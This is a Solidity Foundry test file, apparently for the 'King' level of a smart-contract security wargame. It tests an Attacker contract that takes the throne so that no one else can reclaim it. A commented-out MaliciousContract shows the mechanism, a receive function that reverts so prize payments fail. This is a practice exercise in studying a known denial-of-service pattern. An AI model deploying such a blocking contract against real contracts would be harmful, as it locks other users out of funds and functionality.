// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../lib/forge-std/src/Test.sol";
import {King, Attacker} from "../src/level10.sol";

contract KingTest is Test {
    King public king;
    Attacker public attack;
    address player = makeAddr("player");
    address attackerEOA = makeAddr("attackerEOA");

    uint256 constant INITIAL_PRIZE = 1 ether;

    function setUp() public {
        vm.deal(player, 10 ether);
        vm.deal(attackerEOA, 10 ether);

        vm.startPrank(player);
        king = new King{value: INITIAL_PRIZE}();
        vm.stopPrank();

        vm.startPrank(attackerEOA);
        attack = new Attacker(king);
        vm.stopPrank();
    }

    function test_attack() public {
        // attackerEOA makes the Attacker contract the king
        vm.prank(attackerEOA);
        attack.attack{value: 2 ether}(); // becomes king

        // Confirm that Attacker contract is now king
        assertEq(king._king(), address(attack));

        // Now simulate another user trying to become king
        vm.prank(player);
        (bool success, ) = address(king).call{value: 3 ether}("");
        assertFalse(
            success,
            "Player should not be able to become king anymore"
        );
    }
}

// // Malicious contract that prevents receiving ETH
// contract MaliciousContract {
//     constructor(King _king) payable {
//         payable(address(_king)).transfer(msg.value); // Become king
//     }

//     receive() external payable {
//         revert("Cannot transfer ETH"); // Block prize payments
//     }
// }
